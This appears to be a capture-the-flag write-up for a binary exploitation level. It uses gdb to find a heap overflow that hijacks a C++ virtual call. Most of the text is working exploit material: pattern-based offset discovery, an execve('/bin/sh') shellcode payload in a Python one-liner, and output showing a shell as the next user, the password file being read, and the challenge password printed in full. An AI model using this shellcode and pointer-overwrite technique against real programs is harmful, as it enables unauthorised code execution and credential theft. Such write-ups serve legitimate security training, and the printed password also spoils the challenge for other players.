When disassembling with gdb:
```
...
0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc> // SetAnnotation() is called with argv[1]
0x0804867c <+136>:	mov    0x10(%esp),%eax
0x08048680 <+140>:	mov    (%eax),%eax
0x08048682 <+142>:	mov    (%eax),%edx
...
0x08048693 <+159>:	call   *%edx
...
```

We try an overflow to see what happens:
```
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Starting program: /home/user/level9/level9 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
(gdb) i r
eax            0x41366441	1094083649
ecx            0x67413567	1732326759
edx            0x804a0d4	134521044
ebx            0x804a078	134520952
esp            0xbffff640	0xbffff640
ebp            0xbffff668	0xbffff668
esi            0x0	0
edi            0x0	0
eip            0x8048682	0x8048682 <main+142>
```

We couldn't overwrite eip but we overwrote eax, and the code does something with eax later on
It deferences it twice, places the content in edx and then calls edx

We can write a payload that will make its way to a malicious payload this way:
[shellcode_address] [shellcode] [padding to +108] [start address of this payload]

We get the address of our payload:
```
(gdb) b *main+136
Breakpoint 1 at 0x804867c
(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Starting program: /home/user/level9/level9 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x0804867c in main ()
(gdb) x/s $eax
0x804a00c:	 'A' <repeats 46 times>
```

It's 0x0804a00c !

```
./level9 $(python -c "print '\x08\x04\xa0\x10'[::-1] + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + 'A'*83 + '\x08\x04\xa0\x0c'[::-1]")
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```